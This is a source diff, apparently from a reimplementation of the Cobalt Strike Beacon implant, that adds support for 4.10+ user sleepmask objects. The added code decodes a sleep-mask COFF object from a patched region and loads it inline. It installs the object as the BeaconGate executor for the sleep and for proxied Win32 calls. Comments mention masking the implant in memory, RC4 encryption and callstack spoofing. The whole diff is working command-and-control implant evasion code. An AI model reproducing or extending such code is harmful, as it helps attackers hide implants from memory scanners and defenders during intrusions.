@@ -8,6 +8,7 @@
 #include "track_memory.h"
 #include "datastore.h"
 #include "sleepmask_gen3.h"
+#include "beacon_gate.h" /* FUNCTION_CALL, gate_set_executor */
 #include "parse.h"
 #include <stdlib.h>
 
@@ -44,6 +45,71 @@ static int kit_path_forced(void) {
 	return pGetEnv("BEACON_SLEEPMASK_KIT", buf, sizeof(buf)) > 0 && buf[0] == '1';
 }
 
+#if defined(_M_X64)
+/* ---- the 4.10+ user sleepmask (arsenal-kit contract) ----
+ *
+ * A sleep-mask object built for 4.10+ exports
+ *
+ *     void sleep_mask(PBEACON_INFO info, PFUNCTION_CALL fc)
+ *
+ * and runs every call Beacon hands it - the sleep itself and each
+ * BeaconGate-proxied Win32 call - masking Beacon around it when fc->bMask
+ * says so. The object sits in the SSSS region with bit 31 of the length
+ * word set (the TS sets it for the kit's dictionary hook return) and is
+ * loaded afresh for every call through the ordinary COFF loader (boff.cpp
+ * conv 2), which fills the BEACON_INFO from the live image. What this does
+ * not give a mask is memory of its own between calls - timers, keys, a
+ * kept gadget table - the official engine keeps the object resident. */
+static int g_sm410_state; /* 0 = region not probed, 1 = in service, 2 = none or broken */
+
+static BOOL sm410_exec(FUNCTION_CALL * fc)
+{
+	char * decoded;
+	datap parser;
+	DWORD entry;
+	int dlen, contract, prefix;
+
+	if (g_sm410_state != 1 || fc == NULL)
+		return FALSE;
+	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
+	if (decoded == NULL)
+		return FALSE;
+	dlen = sleepmask_decode(decoded, SLEEPMASK_REGION_PATCH, &contract);
+	if (dlen <= 16 || !contract) {
+		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
+		free(decoded);
+		g_sm410_state = 2;
+		spawn_log("sm410: region has no 4.10 object len=", (long)dlen);
+		return FALSE;
+	}
+
+	/* the object's wire form: [bssSize][six sections][relocations][entry] */
+	data_init(&parser, decoded, dlen);
+	data_int(&parser);
+	data_extract(&parser);
+	data_extract(&parser);
+	data_extract(&parser);
+	data_extract(&parser);
+	data_extract(&parser);
+	data_extract(&parser);
+	prefix = dlen - parser.length;
+	entry = data_int(&parser);
+
+	/* decoded holds the plaintext object while Beacon is masked - pull it
+	 * into the walk, then wipe it before the free */
+	track_memory_add(decoded, SLEEPMASK_REGION_PATCH, TRACK_MEMORY_MALLOC, TRUE, NULL);
+	spawn_log("sm410: exec api=", (long)fc->function);
+	if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)fc, (int)sizeof(FUNCTION_CALL), 2)) {
+		spawn_log("sm410: load FAILED", 0);
+		g_sm410_state = 2;
+	}
+	track_memory_remove(decoded);
+	memset(decoded, 0, SLEEPMASK_REGION_PATCH);
+	free(decoded);
+	return g_sm410_state == 1;
+}
+#endif
+
 void GargleSleep(DWORD time) {
 	spawn_log("gargle: sleep time=", (long)time);
 #if !defined(_M_IX86)
@@ -59,6 +125,29 @@ void GargleSleep(DWORD time) {
 	}
 
 #if defined(_M_X64)
+	/* the 4.10+ user sleepmask, when the region carries one, owns the sleep
+	 * - and, as the gate's executor, every gated call. Its bMask rules are
+	 * the built-in ones (interactive, worker threads, the switches). */
+	if (g_sm410_state == 0) {
+		g_sm410_state = sleepmask_contract() ? 1 : 2;
+		spawn_log("sm410: probe state=", (long)g_sm410_state);
+	}
+	if (g_sm410_state == 1) {
+		FUNCTION_CALL fc;
+		memset(&fc, 0, sizeof(fc));
+		fc.functionPtr = (void *)Sleep;
+		fc.function    = -1; /* not one of the proxied APIs: the sleep itself */
+		fc.numOfArgs   = 1;
+		fc.args[0]     = (unsigned long long)time;
+		fc.bMask       = TRUE;
+		gate_set_executor(sm410_exec);
+		if (sm410_exec(&fc))
+			return;
+		/* the object failed to load: the built-in engines take over */
+		spawn_log("sm410: fell back", 0);
+		gate_set_executor(NULL);
+	}
+
 	/* Phase 1: self-contained Gen3 window (RC4 + callstack spoof) first;
 	 * any init failure falls through to the official sleepmask BOF. */
 	if (!kit_path_forced() && gen3_sleep(time))
@@ -72,12 +161,12 @@ void GargleSleep(DWORD time) {
 	return;
 #endif
 
-	decoded = (char *)malloc(16384);
+	decoded = (char *)malloc(SLEEPMASK_REGION_PATCH);
 	if (decoded == NULL) {
 		Sleep(time);
 		return;
 	}
-	dlen = sleepmask_decode(decoded, 16384);
+	dlen = sleepmask_decode(decoded, SLEEPMASK_REGION_PATCH, NULL);
 	if (dlen > 16) {
 		datap parser;
 		DWORD entry;
@@ -95,7 +184,7 @@ void GargleSleep(DWORD time) {
 		entry = data_int(&parser);
 		/* decoded holds the plaintext sleep-mask BOF across the masked
 		 * sleep - pull it into the walk, then wipe it before free */
-		track_memory_add(decoded, 16384, TRACK_MEMORY_MALLOC, TRUE, NULL);
+		track_memory_add(decoded, SLEEPMASK_REGION_PATCH, TRACK_MEMORY_MALLOC, TRUE, NULL);
 #if defined(_M_X64)
 		be_time = time;
 		if (!command_inline_execute_object_parsed(decoded, prefix, entry, (char *)&be_time, (int)sizeof(be_time), 1))
@@ -106,11 +195,11 @@ void GargleSleep(DWORD time) {
 			Sleep(time);
 #endif
 		track_memory_remove(decoded);
-		memset(decoded, 0, 16384);
+		memset(decoded, 0, SLEEPMASK_REGION_PATCH);
 		free(decoded);
 		return;
 	}
-	memset(decoded, 0, 16384);
+	memset(decoded, 0, SLEEPMASK_REGION_PATCH);
 	free(decoded);
 
 	/* The 4.5 trampoline body is an INT3 placeholder in this codebase (the
